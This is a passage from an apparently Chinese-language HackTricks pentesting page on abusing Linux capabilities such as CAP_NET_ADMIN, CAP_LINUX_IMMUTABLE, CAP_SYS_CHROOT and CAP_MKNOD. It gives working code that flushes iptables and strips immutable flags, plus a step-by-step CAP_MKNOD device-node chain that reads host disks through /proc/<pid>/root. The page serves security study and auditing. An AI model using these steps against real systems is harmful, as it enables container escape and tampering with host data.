    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 赋予持有者**更改网络配置**的能力，包括当前 network namespace 中的防火墙设置、路由表、套接字权限和网络接口设置。它还可以在该 namespace 中的网络接口上启用混杂模式；这可能会暴露发往该接口的流量，但仅凭此能力并不能嗅探其他 network namespace 中任意接口的流量。<sup>[[14]](#references)</sup>

这些操作会影响进程的**当前 network namespace**。要控制主机网络状态，需要使用 `--network=host`、Kubernetes 的 `hostNetwork: true`，或单独的 namespace-entry 原语。单独的 `CAP_NET_RAW` 并不是通用的主机 shell，但它曾参与过一个有文档记载的、特定于协议的逃逸链：一个历史性的 GCE 攻击链结合了 root、主机 network namespace、`CAP_NET_ADMIN`、`CAP_NET_RAW`、明文 metadata 流量，以及可竞态利用的 guest-agent 请求来注入 SSH key。完整的前置条件和现代 HTTPS metadata 的注意事项，请参阅 [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html)。

**使用二进制文件的示例**

假设 **python 二进制文件**具有以下 capabilities。

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**此 capability 允许修改 inode 标志，例如 immutable 和 append-only。**它不会直接赋予更广泛的权限提升能力。<sup>[[14]](#references)</sup>

**使用二进制文件的示例**

如果你发现某个文件是 immutable 的，而 Python 具有此 capability，你就可以**移除 immutable 属性并使文件可修改：**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

`FS_IOC_GETFLAGS` 和 `FS_IOC_SETFLAGS` 操作用于读取和更新 inode 标志；此示例清除的是不可变标志 `FS_IMMUTABLE_FL`。<sup>[[27]](#references)</sup>

> [!TIP]
> 请注意，通常使用以下命令设置和移除此不可变属性：
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许执行 `chroot(2)` 系统调用，可通过已知技术逃离构造不完善的 `chroot(2)` jail。<sup>[[11]](#references)[[14]](#references)</sup>

这是 **chroot-jail escape capability，而非 standalone container-to-host escape**。它既不会暴露宿主机文件系统，也不会绕过其权限。如果宿主机的 root 文件系统已挂载，或可通过 `/proc/<pid>/root` 访问，`chroot()` 只是将该现有目录树设为进程的路径根目录。另一方面，使用 `setns(2)` 更改 mount namespace，需要调用者的 user namespace 中同时具有 `CAP_SYS_CHROOT` 和 `CAP_SYS_ADMIN`，并且在拥有目标 mount namespace 的 user namespace 中具有 `CAP_SYS_ADMIN`。<sup>[[14]](#references)</sup>

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 允许执行 `reboot(2)` 系统调用来重启系统，包括 `LINUX_REBOOT_CMD_RESTART2` 等命令；它还允许使用 `kexec_load(2)`，并且从 Linux 3.17 起，允许使用 `kexec_file_load(2)` 分别加载新的或经过签名的 crash kernel。<sup>[[14]](#references)</sup>

在私有 PID namespace 中，受支持的 `reboot()` 请求会终止该 namespace 的 init 进程，而不是重启宿主机。因此，要影响宿主机重启，必须位于初始 PID namespace 中，通常需要共享宿主机 PID。基于 kexec 的接管还需要兼容的映像、可用的系统调用，以及允许操作的 lockdown 和签名策略。不要仅为验证该 capability，就在共享宿主机上触发上述任一操作：

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中从更广泛的 **CAP_SYS_ADMIN** 中分离出来，专门授予使用 `syslog(2)` 调用的能力。当 `kptr_restrict` 设置为 1 时，此 capability 可通过 `/proc` 和类似接口查看内核地址；该设置用于控制内核地址的暴露。从 Linux 2.6.39 起，`kptr_restrict` 的默认值为 0，也就是说会暴露内核地址，不过出于安全原因，许多发行版会将其设为 1（隐藏地址，但 uid 0 除外）或 2（始终隐藏地址）。<sup>[[14]](#references)</sup>

此外，当 `dmesg_restrict` 设置为 1 时，**CAP_SYSLOG** 允许访问 `dmesg` 输出。尽管做出了这些更改，由于历史原因，**CAP_SYS_ADMIN** 仍保留执行 `syslog` 操作的能力。<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 扩展了 `mknod` 系统调用的功能，使其不仅能创建常规文件、FIFO（命名管道）或 UNIX 域套接字，还能创建特殊文件，包括：<sup>[[14]](#references)</sup>

- **S_IFCHR**：字符特殊文件，例如终端等设备。
- **S_IFBLK**：块特殊文件，例如磁盘等设备。

对于需要创建设备文件（包括字符设备或块设备）的进程，此 capability 很有用。<sup>[[14]](#references)</sup>

它包含在 Docker 文档所述的默认 capability 集中；不要假设每种部署都使用相同的默认值，应核实实际运行时配置（[Moby 默认 capability 列表](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)）。<sup>[[19]](#references)</sup>

对于 container escape，`CAP_MKNOD` 可以为真实的主机设备创建一个缺失的句柄，但它**不会**创建底层设备，也**不会**绕过 device cgroup。完整链条需要满足以下条件：

1. 在初始 user namespace 中具有有效的 `CAP_MKNOD`，因为设备创建不受 namespace 隔离。
2. 真实主机设备对应的正确块设备或字符设备类型，以及主设备号/次设备号。
3. device cgroup 允许打开该设备。
4. 兼容的、支持文件系统的读取工具，或用于挂载块文件系统的 `CAP_SYS_ADMIN`。
5. 文件系统和 LSM 允许创建和使用该节点。

对于真实主设备号/次设备号为 `252:1` 的 ext 系列实验室块设备，可以进行以下只读验证：

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

将这些数字替换为 `/sys/class/block/<device>/dev` 中报告的值。如果创建设备节点成功，但打开时返回 `Operation not permitted`，则 device cgroup 仍在阻止访问。这是在仅具有 Docker 默认 `CAP_MKNOD`、且未明确允许设备访问的容器中通常会出现的结果。

还有一种独立的 **two-foothold local privilege-escalation** 技术，不应与直接访问容器设备混淆。共享初始 user namespace 的容器中的 root 进程可以创建设备块节点，而宿主机上 UID 匹配的非特权 shell 则通过 `/proc/<container-pid>/root` 打开该节点。随后，打开操作会在宿主机 shell 所属的 cgroup 中进行，因此容器的 device-cgroup 拒绝规则不再能保护该设备。<sup>[[7]](#references)</sup>

在容器内创建设备节点，并让一个进程以现有宿主机 foothold 的 UID 持续运行：

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

从当前已有的、使用该 UID 的宿主机 shell 中，找出处于休眠状态的容器进程对应的主机 PID，并将其 procfs 根目录用作设备路径：

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

这条链需要两个 foothold、identity-mapped 或共享的 user namespace、遍历目标 `/proc/<pid>/root` 的权限、主次设备号正确的真实设备，以及允许该 open 操作的外层 cgroup。`hidepid`、ptrace 访问规则、LSM、文件系统不兼容或 user namespace 重映射都可能使其失效。这种历史技术的价值恰恰在于说明 `/proc/<pid>/root` 如何绕过*容器的* device-cgroup 限制；它并不表示单靠 `CAP_MKNOD` 就能逃出通常情况下隔离良好的容器。<sup>[[7]](#references)</sup>

### CAP_SETPCAP

在支持 file capabilities 的当前 Linux 内核上，**`CAP_SETPCAP`** 允许线程将其 bounding set 中的 capabilities 添加到 inheritable set、从 bounding set 中删除 capabilities，以及更改其 securebits。它不允许进程任意向另一个进程授予 capabilities；这种行为仅适用于不支持 file capabilities 的 2.6.25 之前的内核。<sup>[[14]](#references)</sup>

`capset()` 系统调用可以调整线程自身的 effective、permitted 和 inheritable sets，但新的 permitted set 不能包含现有 permitted set 之外的 capabilities，而对 inheritable set 的更新仍受内核约束。<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux capabilities 权限提升实验](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Linux 权限提升](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux 容器基础：Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 入门 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [利用 Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [过多的 Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [滥用通过 /proc/pid/root 访问 mount namespaces 的权限](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities：存在的原因及其工作原理](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [理解 Linux 中的 Capabilities](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [ptrace 获准时绕过 seccomp 的 PoC](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [如何逃出各种 chroot 方案](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Sebastian Krahmer 编写的原始 CAP_DAC_READ_SEARCH Docker 逃逸 exploit](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Docker 逃逸 exploit 分析](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux 手册页](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux 手册页](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu 手册页](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux 手册页](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [运行容器 - Docker 文档](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker 文档](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux 手册页](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux 手册页](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux 手册页](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
